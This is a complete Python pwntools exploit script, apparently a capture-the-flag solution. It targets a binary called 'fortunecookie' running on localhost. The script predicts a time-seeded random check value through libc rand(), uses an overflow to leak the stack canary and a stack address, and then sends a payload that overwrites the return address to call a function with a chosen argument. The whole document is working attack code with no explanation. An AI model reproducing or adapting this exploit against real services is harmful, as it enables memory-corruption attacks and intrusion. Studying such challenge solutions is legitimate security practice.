from pwn import *
import ctypes

def get_canary():
	v3=LIBC.rand()
	v4=LIBC.rand()*v3
	v5=LIBC.rand()
	v10=v4*v5
	v10=v10 & 0x00000000ffffffff
	return v10


r=remote('localhost',9090)

LIBC=ctypes.cdll.LoadLibrary("libc-2.19.so")
binary=ELF('/home/scriptkid/Downloads/sweetchip/fortunecookie/fortunecookie')

t=LIBC.time(0)
LIBC.srand(t)

######################change number#################

print r.recvuntil('> ')
random_canary=get_canary()
r.sendline('1')
print r.recvuntil('Input your string : ')
r.sendline('\xff'*100+'\xff')

####################leak canary####################

print r.recvuntil('> ')
random_canary=get_canary()
r.sendline('1')
print r.recvuntil('Input your string : ')
r.sendline('\xff'*100+p32(0x0fffffff)+p32(random_canary)+'f')
print r.recvuntil('This is your string : ')
print "recv:"+r.recv(109)
canary=u32('\x00'+r.recv(3))
print "canary:"+hex(canary)

####################leak stack####################

print r.recvuntil('> ')
random_canary=get_canary()
r.sendline('1')
print r.recvuntil('Input your string : ')
r.sendline('\xff'*100+p32(0x0fffffff)+p32(random_canary)+'\xff'*4)
print r.recvuntil('This is your string : ')
print "recv2:"+r.recv(112)
ecx=u32(r.recv(4))
print "ecx:"+hex(ecx)

######################payload#######################

print r.recvuntil('> ')
random_canary=get_canary()
r.sendline('1')
print r.recvuntil('Input your string : ')

key=0x0804A0A0
pl=0x08048B1C

pay='\xff'*100+p32(0x0fffffff)+p32(random_canary)+p32(canary)+p32(ecx)+'f'*24+p32(0x08048620)+'f'*4+p32(key)

r.sendline(pay)
print "send complete"
print r.recvuntil('> ')

######################exit#####################

r.sendline('2')
print r.recvuntil('p')
print r.recv()
